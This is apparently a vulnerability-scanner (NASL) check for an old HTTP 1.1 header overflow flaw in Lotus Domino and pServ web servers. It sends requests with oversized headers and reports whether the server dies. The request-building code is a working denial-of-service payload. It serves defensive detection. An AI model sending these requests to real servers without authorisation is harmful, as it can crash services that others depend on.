# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11129");
  script_version("2024-05-03T15:38:41+0000");
  script_tag(name:"last_modification", value:"2024-05-03 15:38:41 +0000 (Fri, 03 May 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-0180", "CVE-2003-0181");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("HTTP 1.1 Header Overflow DoS Vulnerability");
  script_category(ACT_DENIAL);
  # All the www_too_long_*.nasl scripts were first declared as
  # ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
  # The web server might be killed by those generic tests before the scanner
  # has a chance to perform known attacks for which a patch exists
  # As ACT_DENIAL are performed one at a time (not in parallel), this reduces
  # the risk of false positives.

  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210128215916/http://www.securityfocus.com/bid/6951");

  script_tag(name:"summary", value:"It was possible to kill the web server by sending an invalid
  request with a too long HTTP 1.1 header (Accept-Encoding, Accept-Language, Accept-Range,
  Connection, Expect, If-Match, If-None-Match, If-Range, If-Unmodified-Since, Max-Forwards, TE,
  Host)");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET requests and checks if the
  service is still responding.");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make the web server
  crash continually or even execute arbirtray code on your system.");

  script_tag(name:"affected", value:"Lotus Domino Web Server prior to 6.0.1 and pServ are known to
  be affected. Other versions or products might be affected as well.");

  script_tag(name:"solution", value:"Update your software or protect it with a filtering reverse
  proxy.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

# Cf. RFC 2068
#
# nb: The original VT had the following comment:
# > I don't even know if it crashes any web server...

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

r = string("GET / HTTP/1.1\r\nHost: ", crap(1024), "\r\n\r\n");

send(socket:soc, data:r);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

r1 = string("GET / HTTP/1.1\r\nHost: ", get_host_ip(), "\r\n");

requests = make_list(
string(r1, "Accept-Encoding: ", crap(4096), "compress, *\r\n\r\n"),
string(r1, "Accept-Language: en, ", crap(4096), "\r\n\r\n"),
string(r1, "Accept-Range: ", crap(data:"bytes", length:4096), "\r\n\r\n"),
string(r1, "Connection: ", crap(data:"close", length:4096), "\r\n\r\n"),
string(r1, "Expect: ", crap(4096), "=", crap(4096), "\r\n\r\n"),
string(r1, "If-Match: ", crap(4096), "\r\n\r\n"),
string(r1, "If-None-Match: ", crap(4096), "\r\n\r\n"),
string(r1, "If-Range: ", crap(4096), "\r\n\r\n"),
string(r1, "If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ", crap(data:"GMT", length:1024), "\r\n\r\n"),
string(r1, "Max-Forwards: ", crap(data:"6", length:4096), "\r\n\r\n"),
string(r1, "TE: deflate, ", crap(4096), "\r\n\r\n"));

foreach request(requests) {

  soc = http_open_socket(port);
  if(!soc)
    continue;

  send(socket:soc, data:request);
  http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
